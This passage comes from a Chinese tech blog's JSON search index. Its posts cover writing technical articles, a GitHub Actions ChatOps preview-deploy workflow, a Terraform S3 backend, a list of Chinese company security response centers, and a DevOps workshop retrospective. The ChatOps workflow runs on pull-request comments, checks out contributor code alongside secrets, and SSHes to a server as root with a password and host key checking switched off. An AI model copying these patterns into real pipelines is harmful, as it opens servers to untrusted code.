(打字)，只不过，写作面向的是人，写代码面向的是机器。\n写代码是为了能控制机器的状态，让其按照预设的指令转换；而写作是为了传达知识，让其他人能够按照预设的逻辑理解。\n因此，写代码和写作其实是两种很贴近的模式。同时，对于工程师来说，写作如写代码一般重要。\n对于一个学习者，听说读写是绕不开的基本技能。通过听读，输入知识；通过说写，输出知识。\n教学相长，在输出知识的同时，教学者也会进一步得到提高。写作就是其中非常重要的一个环节。\n写作可以提升对知识的理解深度、自我表达能力、个人影响力，让自己的思路更加清晰，对问题的理解更加透彻。下面我们一起来看看，如何像写代码一样写技术文章。\n2. 选好主题 - 找准需求 选好主题就是要找准目标人群，选择自己最擅长、最感兴趣的方向进行写作。这里有一些方向，可供参考:\n前沿趋势 在科技媒体头版、GitHub Trending、Google Trends、行业主流公众号、CNCF 大会等，都可以找到前沿趋势的踪迹。如果对行业有所观察，那么前沿趋势会是一个不错的选择。比如，边缘计算、Serverless 等。\n产品介绍 选择有前景的产品，将产品带到合适的人面前，是一件很棒的事。因为，很多人没有使用一个产品，可能只是因为不知道有这个产品。作为一个布道者，能够给大家带来巨大的价值。\n技术优化 在工作的过程中，会碰到一些技术瓶颈，通过一步一步地优化，我们最终解决了问题。记录解决问题的过程，思考产生问题的原因，挖掘潜在的风险，对业务来说非常重要。\n学习笔记 不要随意地复制粘贴知识片段，然后保存作为学习笔记，那并不是你掌握的知识。像写文档一样，认真写好学习笔记，才能与已有的知识体系融为一体。\n竞品比较 比较市场上不同产品之间的差异，给出测评结果，将会非常考验人对领域知识深度和宽度的掌握。但是，竞品比较是人们最愿意阅读和议论的方向。\n场景应用 针对某一个产品，在不同场景下的不同使用方式，反复多次实践。这是一个产出率非常高的选题方向。\n思考心得 对工作、对行业、对人生，都需要定期总结。时间只能给我们宽度，自我审视才能给我们深度。\n3. 列出提纲 - 设计架构 3.1 总结分论式 《研发如练兵，运营如用兵》\n思想驱动行为 研发如练兵 运营如用兵 首先给出一个总结性的描述，然后对相关的模块分别进行详细介绍，各个击破。\n3.2 实验报告式 《Kubernetes 动态创建 Jenkins Agent 压力测试》\n集群配置 Jenkins 配置 测试策略 测试结果 测试总结和建议 首先给出前提配置，然后描述执行过程，得到执行结果，最后进行总结和评论。忠实的记录者，不带任何感情，犹如一篇实验报告。\n3.3 并行罗列式 《你不知道的 Docker 使用技巧》\n分阶段构建 利用缓存构建 使用 S2I 打包应用 .dockerignore 文件 将容器保存为镜像 围绕一个主题，使用排比的手法，不断地罗列举证，以此强调主题。\n3.4 故事引导式 《运营不再是拍脑袋的事》\n运营不再是拍脑袋的事 精细化运营了解用户行为 短链接的妙用 下载链接也能做文章 首先通过一个新颖的描述，抓住眼球，然后引出主题，给出核心观点，建立若干支撑论点。\n3.5 对比论述式 《使用 S2I 构建云原生应用》\nS2I 能解决什么问题 S2I 的特点 S2I 与 buildpack 区别 尝试使用 S2I 通过比较的手法，与同类主题进行差异化对比，借助同类主题，快速进入读者的心智。\n3.6 优化递进式 《Kubernetes 中如何获取客户端真实 IP》\n创建一个后端服务 直接通过 NortPort 访问获取真实 IP 通过 LB -\u0026gt; Service 访问获取真实 IP 通过 LB -\u0026gt; Ingress -\u0026gt; Service 访问获取真实 IP 总结 围绕一个问题，不要直接给出最佳的方案，要不断地优化方案，给出优化的路线，展现逻辑的演变过程。一波未平一波又起，跌宕起伏，在湮灭与希望中辗转，岂不妙哉。\n3.7 采访问答 Q: DevOps 是什么\nA: DevOps 是一种文化\nQ: 为什么需要这种文化\nA: \u0026hellip;\n一问一答，像柏拉图、孔子一样，采用对话的方式阐述其思想。以第三方的角度，以问答的形式，表达出观点。\n4. 填充内容 - 编码实现 建议阅读阮一峰的中文技术文档的写作规范 。\n简单列举一下，我比较注意的几个点:\n断句。无论是否适合断句，我都会适当加标点，避免一句话太长没有停顿。 区分地的。接动词用 \u0026ldquo;地\u0026rdquo;，接名词用 \u0026ldquo;的\u0026rdquo; 。这也是我检验文档描述用词，是否准确的一个小技巧。 英文、数字前后加空格。看起来更美观。 避免歧义的描述。即使有 99.99% 的可能，也不能描述成一定。 尽量使用客观描述。少使用，我认为、我觉得，这样的关键字。 5. 矩阵传播 - 运营上线 有了文章内容之后，我们完成了从无形到有形的转换，有了第一个传播媒介。根据文档，还可以继续扩充传播媒介，转换为系列文章、书籍、短视频、长视频、直播、分享、课程等。\n然后就是如何抵达用户。下面是一些科技用户常驻地：\n搜索引擎推荐，SEO 百家号、头条号、博客园、CSDN、腾讯云社区，简书、InfoQ、TWT、Reddit、Medium、Dzone 朋友圈、微信群、QQ 群、微博 抖音、快手、视频号、B 站、Youtube V2EX、知乎、Linkedin、Twitter、Facebook 6. 持续研发运营 一个好的系统是不断迭代优化，不断经营用户出来的。不用在乎起点，也不用在乎速度，只要选好了方向，干下去就能收获美好，因为坚持本身就是一件很值得回忆的事情。\n日拱一卒无有尽，功不唐捐终入海。再小的进步，再小的努力，随着时间的推移，也会变得非常有意义。\n人们常常会放大短期的影响，而忽略长期的影响。愿你我都能做长期的守护者，持续地投入热情，持续地经营琢磨，让一件件小小的事情变得美妙。\n没错，我说的是写作。\n","description":"","id":251,"section":"post","tags":["博文","思考","团队","写作"],"title":"像写代码一样写技术文章","uri":"https://www.chenshaowen.com/blog/writing-and-coding-follow-the-same-pattern.html"},{"content":"\n在上一篇文档 《使用 ChatOps 改进研发流程》中，通过 ChatOps 给 Pull Requests 提供预览链接提升了敏捷速度。本篇主要描述如何快速实现这个功能。\n1. 第一步: 配置一个触发器 1.1 选择一个触发器 在 GitHub 中有三类 Workflows 触发器，定时、人工、自动触发器。我们需要选择一个自动触发器，用于触发执行逻辑。目前 GitHub Actions 支持的自动触发器有 check_run、check_suite、create、delete、deployment、deployment_status、fork、gollum、issue_comment、issues、label、milestone、page_build、project、project_card、project_column、public、pull_request、pull_request_review、pull_request_review_comment、pull_request_target、push、registry_package、release、status、watch、workflow_run。\n在 workflows.yaml 文件中，on 关键字下添加触发器：\n1 2 3 on: issue_comment: types: [created] 这里选择的是 issue_comment ，当有 Issues 或者 Pull Requests 被评论时，触发 Actions 的执行。\n1.2 定义一个触发关键字 定义关键字是为了关联操作逻辑，主要是匹配过滤，将 /deploy 与 deploy-script 关联起来，将 /clear 与 clear-script 关联起来。\n下面是根据指定 trigger 关键字 /deploy 进行触发的 workflows.yaml 片段。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 jobs: deploy-check: runs-on: ubuntu-latest steps: - name: acknowledge request to commenter id: check uses: khan/pull-request-comment-trigger@master with: trigger: \u0026#34;/deploy\u0026#34; reaction: rocket env: GITHUB_TOKEN: \u0026#34;${{ secrets.GITHUB_TOKEN }}\u0026#34; outputs: triggered: ${{ steps.check.outputs.triggered }} deploy-script: if: needs.deploy-check.outputs.triggered == \u0026#39;true\u0026#39; runs-on: ubuntu-latest needs: deploy-check steps: - name: script run: | echo \u0026#34;start\u0026#34; 2. 第二步: 执行自定义指令 这一步主要是执行一些相应的步骤，用来完成对基础设施的修改。比如，更新服务、部署应用、删除文件等，具有很高的自由度。\n这里主要是需要部署新的服务，并提供一个对外可访问的地址。如果是静态项目的预览，直接使用 netlify 提供的预览服务更好。但是，更多的项目，还是需要远程到服务器上进行操作。\n下面是一个以 root 用户远程到指定服务器，创建并暴露服务的示例。\n1 2 3 4 5 6 7 8 9 10 11 - name: executing remote ssh commands id: deploy_console uses: appleboy/ssh-action@master with: host: ${{ secrets.IP }} username: root password: ${{ secrets.PASSWORD }} port: 22 script: | kubectl run nginx --image=nginx kubectl expose deploy nginx --type=NodePort --port=80 --target-port=80 可以根据具体需要，在 script 中填充自定义的脚本命令。\n3. 第三步: 反馈信息 最后就是需要反馈信息，明确表明任务已经完成，并将完成的结果以某种方式告诉给用户。这里主要提供两种方式：评论回复和 Slack 通知。\n3.1 评论回复 添加相关的 Job 可以实现回复指定的 Issues/Pull Requests 的功能。同时，在评论的内容中，我们也可以引用内置的变量，让回复内容更加详细，含义传达更加有效。\n1 2 3 4 5 6 7 - name: Create comment uses: peter-evans/create-or-update-comment@v1 with: issue-number: ${{ github.event.issue.number }} body: | Congratulations! Deployment succeeded. reactions: heart, hooray, laugh 3.2 Slack 通知 在之前的文档中，我已经分享过《如何配置 Slack 通知》 ，这里不再赘述。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 - uses: 8398a7/action-slack@v3 with: status: custom fields: workflow,job,commit,repo,ref,author,took custom_payload: | { username: \u0026#39;action-slack\u0026#39;, icon_emoji: \u0026#39;:octocat:\u0026#39;, attachments: [{ color: \u0026#39;${{ job.status }}\u0026#39; === \u0026#39;success\u0026#39; ? \u0026#39;good\u0026#39; : \u0026#39;${{ job.status }}\u0026#39; === \u0026#39;failure\u0026#39; ? \u0026#39;danger\u0026#39; : \u0026#39;warning\u0026#39;, text: `Congratulations! Deployment succeeded.`, }] } env: SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK_URL }} 将上面的片段添加到 workflows 即可。\n4. 一些 GitHub Actions 的使用技巧 4.1 切换代码到 Pull Requests 所在分支 在一个 Pull Requests 流程中，通常有两个分支，upstream 和 developer 。而 workflows 的 on 针对当前分支，在 upstream 仓库中，不能直接 Checkout 提交 Pull Requests 的 developer 仓库的分支。\n下面这段片段，可以将代码切换到待合并的开发者分支上。\n1 2 3 4 5 6 7 8 9 10 11 12 13 - name: get pull request ref id: get_pull_request_ref uses: octokit/request-action@v2.x with: route: GET /repos/:repository/pulls/:issue_id repository: ${{ github.repository }} issue_id: ${{ github.event.issue.number }} env: GITHUB_TOKEN: \u0026#34;${{ secrets.GITHUB_TOKEN }}\u0026#34; - uses: actions/checkout@v2 with: repository: ${{ fromJson(steps.get_pull_request_ref.outputs.data).head.repo.full_name }} ref: ${{ fromJson(steps.get_pull_request_ref.outputs.data).head.ref }} 4.2 使用 Deployment 维护部署的状态 GitHub 提供了一个名为 Deployment 的对象，用来管理部署的事件和状态。下面是一个时序图：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 +---------+ +--------+ +-----------+ +-------------+ | Tooling | | GitHub | | 3rd Party | | Your Server | +---------+ +--------+ +-----------+ +-------------+ | | | | | Create Deployment | | | |---------------------\u0026gt;| | | | | | | | Deployment Created | | | |\u0026lt;---------------------| | | | | | | | | Deployment Event | | | |----------------------\u0026gt;| | | | | SSH+Deploys | | | |--------------------\u0026gt;| | | | | | | Deployment Status | | | |\u0026lt;----------------------| | | | | | | | | Deploy Completed | | | |\u0026lt;--------------------| | | | | | | Deployment Status | | | |\u0026lt;----------------------| | | | | | 在页面上的效果如下图：\n使用的方法，可以参考文末提供的链接。\n我最终没有采用这种方式的原因是，在 Pull Requests 下，upstream 不存在 developer 的 PR 分支时，页面找不到 Deployment。好吧，我知道你没明白，不过没关系，推荐用这种方式管理 Deployment，可以先试试。\n4.3 变量的调试方法 在 GitHub Actions 中内置了很多变量，使用第三方 Actions 也会得到很多变量。在调试过程中，如果对变量存在性或值内容存在疑惑，可以直接打印查看。\n下面就是一个示例：\n1 2 3 - name: echo run: | echo ${{ steps.get_pull_request_ref.outputs.data }} 最终打印的部分结果如下:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 { \u0026#34;url\u0026#34;: \u0026#34;https://api.github.com/repos/***/console/pulls/7\u0026#34;, \u0026#34;id\u0026#34;: 548619025, \u0026#34;node_id\u0026#34;: \u0026#34;MDExOlB1bGxSZXF1ZXN0NTQ4NjE5MDI1\u0026#34;, \u0026#34;html_url\u0026#34;: \u0026#34;https://github.com/***/console/pull/7\u0026#34;, \u0026#34;diff_url\u0026#34;: \u0026#34;https://github.com/***/console/pull/7.diff\u0026#34;, \u0026#34;patch_url\u0026#34;: \u0026#34;https://github.com/***/console/pull/7.patch\u0026#34;, \u0026#34;issue_url\u0026#34;: \u0026#34;https://api.github.com/repos/***/console/issues/7\u0026#34;, \u0026#34;number\u0026#34;: 7, \u0026#34;state\u0026#34;: \u0026#34;open\u0026#34;, \u0026#34;locked\u0026#34;: false, \u0026#34;title\u0026#34;: \u0026#34;Feat/workspace group\u0026#34;, ... } 在整个过程中，调试是非常耗时的，我们要掌握一定的方法，才能事半功倍。\n4.4 Output 传递 Step 之间的变量 使用 Output 和 Env 都可以实现 Step 之间的变量传递，这里以 Output 为例：\n1 2 3 4 5 6 7 8 9 10 11 - name: set SERVICE_PORT id: set_port run: | echo \u0026#34;::set-output name=SERVICE_PORT::$(sshpass -p \u0026#34;${{ secrets.QING_PASSWORD }}\u0026#34; ssh -o StrictHostKeyChecking=no root@${{ secrets.EIP }} \u0026#34;kubectl get svc ${{ env.SERVICE_NAME }} -o json | jq .spec.ports[].nodePort\u0026#34;)\u0026#34; - name: Create comment uses: peter-evans/create-or-update-comment@v1 with: issue-number: ${{ github.event.issue.number }} body: | Congratulations! Deployment succeeded. This is the [preview link](http://${{ secrets.EIP }}:${{ steps.set_port.outputs.SERVICE_PORT }}/) . reactions: heart, hooray, laugh 首先通过执行 sshpass 命令拿到服务的端口，设置为 output 变量。然后，在其他的 Step 中，通过 ${{ steps.set_port.outputs.SERVICE_PORT }} 的方式，引用跨 Step 的变量值。\n5. 参考 https://github.com/bobheadxi/deployments https://github.com/SanderKnape/pr-deployments/ https://stackoverflow.com/questions/58737785/github-actions-empty-env-secrets ","description":"","id":252,"section":"post","tags":["博文","研发","DevOps","ChatOps"],"title":"GitHub Actions 三步教你打造 ChatOps 系统","uri":"https://www.chenshaowen.com/blog/using-github-actions-to-build-a-chatops-in-three-steps.html"},{"content":"1. 什么是 ChatOps GitOps、ChatOps、AIOps 等(以下简称 NewOps )是近几年出现的新兴运维理念。NewOps 将 Ops 从混沌的状态离析为两个部分：一个面向用户，趋势是更加人性化、可审计、可回溯；另一个面向基础设施，趋势是更加程序化、自动化、智能化。\n通常，我们关注的 NewOps，更多强调的是与人协作部分，而忽略了底层系统。试想，如果没有 IaC 工具的支持，GitOps 能玩得转吗？没有强大的 AI 系统，怎样去进行 AIOps ? Git、Chat 只是作为一个交互的前端，NewOps 的关键进展来自底层 Ops 的进化。\n下面，我们主要聊一聊 ChatOps 。\n如上图，ChatOps 的前端通过聊天工具驱动，后台通过机器人执行操作，更新基础设施。这里简单介绍一下在 GitHub 上的两种 ChatOps 工具。\nProw 在文档 DevOps 工具链之 Prow 中，我曾做过分享。通过标签驱动开发流程，在 Kuberntes 社区中具有广泛实践，在目前的团队中主要由我负责维护。\nHubot Hubot 是 GitHub 开源的聊天机器人，使用 .coffee 或者 .js 文件进行配置，可以通过评论执行动作。下面是一个官方的示例:\n1 2 3 4 5 6 7 8 9 module.exports = (robot) -\u0026gt; robot.hear /badger/i, (res) -\u0026gt; res.send \u0026#34;Badgers? BADGERS? WE DON\u0026#39;T NEED NO STINKIN BADGERS\u0026#34; robot.respond /open the pod bay doors/i, (res) -\u0026gt; res.reply \u0026#34;I\u0026#39;m afraid I can\u0026#39;t let you do that.\u0026#34; robot.hear /I like pie/i, (res) -\u0026gt; res.emote \u0026#34;makes a freshly baked pie\u0026#34; 当然也有其他的工具或者方案，比如 Slack Bot，这里只是举例而已。再思考一下 ChatOps，实际上它是一个匹配系统，通过匹配关键字，然后执行相应的动作。\n如此简单，那么这里的 Bot 其实可以不必是一个外部服务，对于一些小的需求，几行脚本也能达到目的。\n2. 团队需求和效果 下面简单介绍一下，团队的开发模式。\n前后端分离 新功能由后端先完成 API 开发，接着后端将服务部署到指定的环境上，前端调用指定环境上的 API 进行新功能的开发 仓库采用的是 Monorepo ，准备向 Polyrepo 转变。现在所有组件都耦合在一起，放在一个仓库，未来会拆分到多个单独的仓库。\n目前 Monorepo 遇到的问题是测试没有跟上，导致 Pull Requests 不能迅速合并，版本不能快速迭代，降低了敏捷开发的速度。这里另外一个技巧是使用功能开关，但是功能开关又意味着增加冗余、兼容代码。\n为了尽量减小对研发人员的影响，主要还是需要从测试作为切入点。在之前的文档 使用 Terraform 和 GitHub Actions 对基础设施进行自动化安装测试 中，我对全部组件的交付汇聚点进行了自动化测试。这里，主要是对每个 Pull Requests 提供一个预览的环境。\n前端提交 PR ，等待 All checks 完成之后，只需要回复 /deploy 即可得到一个预览的链接地址。\n在预览验证完成之后，只需要回复 /clear 即可清理因预览产生的负载。\n上线第一天，前端仓库负责人，通过预览就提前发现了一个 PR 的问题，效果还不错。\n3. 参考 https://hubot.github.com/docs/scripting/ ","description":"","id":253,"section":"post","tags":["博文","研发","DevOps","ChatOps"],"title":"使用 ChatOps 改进研发流程","uri":"https://www.chenshaowen.com/blog/using-chatops-to-improve-the-r-and-d-process.html"},{"content":"1. 行业规范 [TPSA19-22]SRC行业安全测试规范: https://security.tencent.com/announcement/msg/180\n2. SRC 列表 序号 上线时间 SRC名称 01 2012 TSRC（腾讯） 02 2013 ZSRC（猪八戒） 03 2013 NSRC（网易） 04 2013 KSRC（金山） 05 2013 JSRC（京东） 06 2013 BSRC（百度） 07 2013 ASRC（阿里巴巴） 08 2013 360SRC（360） 09 2014 YSCR（萤石） 10 2014 CSRC（携程） 11 2014 MISRC（小米） 12 2014 SSRC（新浪） 13 2014 YSRC（欢聚时代） 14 2014 SGSRC（搜狗） 15 2014 QSRC（去哪儿） 16 2015 VSRC（唯品会） 17 2015 SNSRC（苏宁） 18 2015 PSRC（中国平安） 19 2015 LYSRC（同程艺龙） 20 2016 SNSRC（途牛） 21 2016 JJSRC（竞技世界） 22 2016 DSRC（滴滴出行） 23 2016 100TALSRC（好未来） 24 2016 ESRC（饿了么） 25 2016 71SRC（爱奇艺） 26 2016 FSRC（焦点） 27 2016 QMSRC（千米SRC） 28 2016 FSRC（富友安全） 29 2016 恒昌安全 30 2016 WSRC（微众安全） 31 2016 DSRC（点融网） 32 2016 CNSRC（菜鸟网络） 33 2016 WSRC（微博） 34 2016 MLSRC（美丽联合） 35 2017 LXSRC（乐信集团） 36 2017 JYSRC（世纪佳缘） 37 2017 MMSRC（陌陌） 38 2017 BILISRC（哔哩哔哩） 39 2017 NSRC（你我贷） 40 2017 EMSRC（东方财富） 41 2017 DYSRC（斗鱼） 42 2017 WACSRC（挖财） 43 2017 VKSRC（VIPKID） 44 2017 SFSRC（顺丰） 45 2017 MTSRC（美团） 46 2017 MEIXZUSRC（魅族） 47 2018 WIFISRC（WiFi万能钥匙） 48 2018 WDSRC（微贷） 49 2018 ZSRC（中通） 50 2018 字节跳动 51 2018 CESRC（宜信） 52 2018 SAFEDOG（安全狗） 53 2018 KwaiSRC（快手） 54 2018 58SRC(58) 55 2018 YISRC（宜人贷） 56 2018 众安安全 57 2018 DHSRC 58 2018 OSRC（OPPO） 59 2018 优信 60 2018 GZSRC（瓜子） 61 2018 ASRC（蚂蚁金服） 62 2018 PWSRC（完美世界） 63 2018 本木医疗安全应急响应中心 64 2018 ZPSRC（智联招聘） 65 2019 ISRC（iTutorGroup） 66 2019 vivoSRC（VIVO） 67 2019 Rong360SRC（融360） 68 2019 ONESRC(一加) 69 2019 LSRC（联想） 70 2019 SDSRC（享道出行） 71 2019 MFSRC（马蜂窝） 72 2019 法大大 73 2019 ESRC（易宠） 74 2019 （老虎证券） 75 2019 WPSSRC（金山办公） 76 2019 UCLOUD 77 2019 HSRC（华住） 78 2019 水滴安全 79 2019 BKSRC（贝壳） 80 2019 carsrc 81 2019 斗米 82 2019 上上签安全应急响应中心 83 2019 ZMSRC（掌门教育） 84 2019 WSRC（伍林堂安全应急响应中心） 85 2020 BBSRC（贝贝） 86 2020 知识星球应急响应中心 87 2020 ISRC（合合安全） 88 2020 度小满 89 2020 YSRC（云集SRC） 90 2020 BHSRC（百合） 91 2020 XYSRC（小赢安全） 92 2020 AISRC(爱数) 93 2020 T3SRC(T3出行) 94 2020 讯飞SRC 95 2020 旷视SRC 96 2017 大疆SRC 97 2019 华为 3. 参考 https://blog.csdn.net/Aaron_Miller/article/details/107103519 ","description":"","id":254,"section":"post","tags":["整理","安全"],"title":"各大公司安全应急响应中心列表（ALL SRC LIST）","uri":"https://www.chenshaowen.com/blog/all-src-list.html"},{"content":"1. Terraform 如何管理资源状态 在执行 terraform init 之后，Terraform 会将依赖的插件下载到本地 plugins 目录。\n1 2 3 4 5 6 7 8 9 10 11 12 13 tree -aL 5 . |-- myresource.tf |-- .terraform | `-- plugins | |-- registry.terraform.io | | |-- hashicorp | | | `-- null | | `-- shaowenchen | | `-- qingcloud | `-- selections.json `-- var.tf 在执行 terraform apply 之后，Terraform 会使用 terraform.tfstate 文件存储资源的信息。新建 .terraform.tfstate.lock.info 锁定资源，避免多个 Terraform 同时使用一个状态文件。在执行完毕之后， .terraform.tfstate.lock.info 文件会被删除。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 tree -aL 5 . |-- myresource.tf |-- .terraform | `-- plugins | |-- registry.terraform.io | | |-- hashicorp | | | `-- null | | `-- shaowenchen | | `-- qingcloud | `-- selections.json |-- terraform.tfstate |-- .terraform.tfstate.lock.info `-- var.tf terraform.tfstate 是一个 Json 文件，存储了资源的 ID 、状态等信息，格式如下:\n1 2 3 4 5 6 7 8 { \u0026#34;version\u0026#34;: 4, \u0026#34;terraform_version\u0026#34;: \u0026#34;0.13.0\u0026#34;, \u0026#34;serial\u0026#34;: 11, \u0026#34;lineage\u0026#34;: \u0026#34;9359dc1c-9a6d-b1e0-9780-d26500869e82\u0026#34;, \u0026#34;outputs\u0026#34;: {}, \u0026#34;resources\u0026#34;: [...] } 在执行 terraform destroy 之后，Terraform 会新建一个 terraform.tfstate.backup 文件，备份资源状态，接着删除资源。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 tree -aL 5 . |-- myresource.tf |-- .terraform | `-- plugins | |-- registry.terraform.io | | |-- hashicorp | | | `-- null | | `-- shaowenchen | | `-- qingcloud | `-- selections.json |-- terraform.tfstate |-- .terraform.tfstate.backup `-- var.tf 具体的细节没有深究太多，简单点就是 Terraform 使用 Json 存储了资源的状态，默认存储在本地目录下。\n2. 使用 S3 存储 Terraform 的状态 如果在一个团队、GitHub Actions 中，如何持久化存储 Terraform 的状态呢？持久化状态也就是需要将上面的 Json 数据存储在某一个远端持久化服务中。Terraform 支持很多种后端存储，下面是从 Terraform 官网获取的一个 Backend 列表:\nartifactory azurerm consul cos etcd etcdv3 gcs http kubernetes manta oss pg s3 swift Terraform 使用 Backend 模块来处理状态的存储。在 var.tf 文件中，只需要添加一个 backend ，填上参数即可使用远端存储状态。\n1 2 3 4 5 6 7 8 9 10 11 12 13 terraform { backend \u0026#34;s3\u0026#34; { bucket = \u0026#34;terraform-deploy\u0026#34; key = \u0026#34;tf-cd\u0026#34; region = \u0026#34;sh1a\u0026#34; endpoint = \u0026#34;s3.sh1a.qingstor.com\u0026#34; skip_region_validation = true skip_metadata_api_check = true skip_credentials_validation = true access_key = \u0026#34;ACCESS_KEY\u0026#34; secret_key = \u0026#34;SECRET_KEY\u0026#34; } } 在 terraform apply 之后，在支持 S3 的对象存储上，就可以看到状态文件:\n如果需要 lock 状态文件，可以使用类似 DynamoDB 的 BaaS 保证数据的一致性。\n3. 参考 https://www.terraform.io/docs/backends/types/s3.html ","description":"","id":255,"section":"post","tags":["博文","S3","Terraform"],"title":"使用 S3 存储 Terraform 的状态","uri":"https://www.chenshaowen.com/blog/using-s3-to-store-terraform-state.html"},{"content":"\n1. 什么是 Workshop Workshop ( 工作坊 ) 是以领域富有经验的主讲人为核心，通过活动、讨论、演讲等方式，指导成员共同讨论某个话题的学习形式。\n相较于传统的方式，Workshop 具有如下特点:\n更具有针对性 有点像研习班，可以针对某一类问题，集中、充分地进行讨论。\n组织更加灵活 对于活动地点、方式具有更多选择，可以是户外，也可以是会议室、茶水间等。\n费用更加低廉 通常采用的是 AA 制，参与者只需要支付餐费和场地费即可，没有额外的开销。\n以上内容组织自 mbalib 。互联网产品类的 Workshop 与之有所不同，主要体现在如下方面:\n内容更加具体，针对某个产品 Workshop 的主要目的是推广产品，让用户体验、思考、掌握产品。\n费用免费 处于成长期的组织方，不会收取参加 Workshop 的学员任何费用。很多互联网的大会，都提供免费的茶歇、礼品等，吸引用户参与，Workshop 也不例外。\n2. 我的 Workshop 经历 有幸在大厂待过，公司有很多内部培训。涉及项目管理、时间管理、企业战略等类型的课程时，培训老师通常会将学员分组，以小团队讨论，共同输出的形式授课。这应该是参加工作之后，我最早接触的 Workshop 。\n而我参与组织的 Workshop 有两次。\n一次是一个 SaaS 开发课程。学员主要来自公司内部，讲师讲一个任务，学员操作一个任务，台下有助教辅导学员。但效果不理想，主要原因是在没有基础的情况下，现场开发一个 SaaS 的难度挺大，要求全栈技能，一般人完成不了。Workshop 后期有些失控，做任务的人少，与助教聊产品的人多。\n好的方面是，这是一系列的公开课之一，在其他环节可以弥补 Workshop 。\n另一次就是下面即将复盘的 DevOps Workshop。\n3. DevOps Workshop 复盘 3.1 预期差 首先来看目标：\n20 人参与 Workshop 使用 DevOps 产品完整部署一条流水线 接着来看结果：\n8 人参加 Workshop，而且主要是现场参赛、非报名学员 没有一个人完成任务 从结果来看，我认为非常糟糕，Workshop 失控了。参加 Workshop 的人数、完成的质量、完成的程度都没有达到预期。\n3.2 问题在哪里 没有对学员进行定位 在讨论任务列表时，就发生了歧义，有的认为不应该假定学员的水平高低，有的认为学员对产品不会有很深入了解，应该简单点。\n目标不聚焦 在选择开发环境时，考虑的是给其他产品引流用户，而不是聚焦 Workshop 本身。\n任务列表和现场流程确认很晚 在 Workshop 的前一周，才开始讨论任务列表和现场流程，没有预留充足的时间准备，也没有找其他同事模拟 Workshop 流程。\n宣传太晚 在 Workshop 前两天才开始出海报，宣传活动，招募不到足够多的学员。虽然报名人数超过了 20 ，但是基本都没到现场。\n无法主动筛选学员 由于报名人数少，无法筛选学员、挑选更加匹配的学员参加 Workshop。\n大部分学员来自现场 现场参加 Workshop 的学员，水平参差不齐，不易达成 Workshop 的目标。\n开发环境混乱 一开始准备让学员自己注册账户，赠送优惠券。Workshop 前一天又临时改成公共子账户。\n在现场初始化开发环境时，由于疏漏，忘了绑定 EIP，导致无法访问外网。又让学员使用研发的环境，接着研发的环境只有一个节点被玩坏，又切换到另外一个公共研发环境，最后又切回子账户开发环境。\n我都说晕了，几个开发环境来回切换。\n现场没有按照流程走 写了 PPT，但没有按照 PPT 的章节进行各个事项。\n还有一些不可抗力因素 这里主要指的是活动地点处于敏感地区，影响了参与人数；活动时间与其他大厂活动时间严重冲突。\n4. 好的 Workshop 应该是怎么样的 上面说了很多问题，那么好的 Workshop 应该是怎么样的呢？避开上面的这些问题就够吗？基本够了，但我想强调的不是怎么去做，而是怎样去思考。\nWorkshop 有很多的细节可以去优化，可以去做得更好。但我们应该以怎样一个角度去思考呢？\n一个好的 Workshop 应该流程畅通。这种流畅来自于确定性下的演练。不能有太多不确定性的因素，讲师需要反复的练习，模拟可能发生的情况。\n一个好的 Workshop 应该内容充盈。饱满溢出的感觉，会让学员耳目一新，收获满满。在提高认知的同时，也达成了 Workshop 的目标。\n一个好的 Workshop 应该学员熟悉。聚在一起是缘分，能够相知，互助学习，收获友谊，也算是 Workshop 之外的一份礼物。\n一个好的 Workshop 应该持续经营。Workshop 是起点，不是终点。有了一个好的开始，还需要持续地维护经营。\n5. 参考 https://wiki.mbalib.com/wiki/%E5%B7%A5%E4%BD%9C%E5%9D%8A ","description":"","id":256,"section":"post","tags":["博文","总结","思考","DevOps","Workshop"],"title":"DevOps Workshop 复盘总结","uri":"https://www.chenshaowen.com/blog/the-summary-of-devops-workshop.html"},{"content":" 更多的技巧，请持续关注本文的更新。\n1. 运营不再是拍脑袋的事 万物互联，互联网对物理世界的建模越来越准确。我们的地理位置、行动轨迹、在电子设备上的操作都在被记录。如果能汇集各大厂商的用户画像，我们的数字版就出来了。\n你只能代表此刻的你，而数字人可以代表过去、现在，甚至将来的你。数据一旦产生，在互联网上是很难被完全抹灭的，数据人拥有更完整的描述。\n相较于程序的稳定，人的优势来自不确定性，因而会有创新、会有新的视角。如果任由发散，这种创造性很难汇聚成一股强劲的推力。所以，我们需要基于一定的数据基础、理论根据，带入场景去思考。\n现在的互联网给了我们很多的数据去分析。而运营不能再依靠个人的感觉，要利用各种用户增长工具，通过定量的分析进行决策。\n2. 精细化运营了解用户行为 运营和研发是很难并重的。我在文档《研发如练兵，运营如用兵》中提到，研发的关键是制度，运营的关键是借势。总不能边练兵，边外出打仗吧。\n实际上，一个团队的精力和时间是十分有限的，在不同的阶段，会有不同的侧重点。在项目的初期，研发更加重要，早期打好根基；在项目的成长期，运营更加重要，小规模实验铺开，积极响应反馈，维护好用户群体；在项目的成熟期，大规模实践时会暴露很多的问题，需要再次回归到研发。\n如果进入到成长期，就该重视运营，多了解用户的行为，他们从哪里来，在这里做什么，要到哪里去。\n即使是一个跳转链接，也可以做文章，重要的是数据运营的意识，多去了解用户的行为。比如，www.chenshaowen.com 跳转的是 www.chenshaowen.com?from=blog 而不是 www.chenshaowen.com ，地址一样，只不过多了一个 Get 参数，我们就可以知道更多信息。\n一个不了解互联网是如何运行的人，是做不好运营的。成千上万台服务器，运行着我们日常访问的各种各样的网站。但基本的通信协议，访问原理是保持一致的，这也正是互联网能够不断扩大边界的原因，因为他们具有共同的基础。如果从事互联网工作，那么一定要不断地提高对它的认知。\n运营的精细化就是在不断地拆分和细化，我们的产品如何到达用户，用户如何使用产品。从最开始的一个文档链接，到产品试用，然后付费，最后长期使用，每一个环节都可以推敲琢磨。\n3. 短链接的妙用 通常的数据分析工具，比如 Google Analytics，新一代的 Growingio 